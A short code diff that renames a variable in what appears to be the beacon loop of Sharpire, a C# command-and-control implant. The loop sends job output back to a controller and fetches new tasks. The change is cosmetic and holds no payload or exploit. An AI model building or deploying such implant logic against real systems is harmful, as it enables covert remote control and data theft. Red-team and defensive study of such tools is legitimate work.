@@ -125,10 +125,10 @@ namespace Sharpire
                 Thread.Sleep(sleepTime * 1000);
             }
 
-            byte[] jobResults = jobTracking.GetAgentJobsOutput(ref coms);
-            if (0 < jobResults.Length)
+            byte[] jobPackets = jobTracking.GetAgentJobsOutput(ref coms);
+            if (jobPackets.Length > 0)
             {
-                coms.SendMessage(jobResults);
+                coms.SendMessage(jobPackets);
             }
 
             byte[] taskData = coms.GetTask();
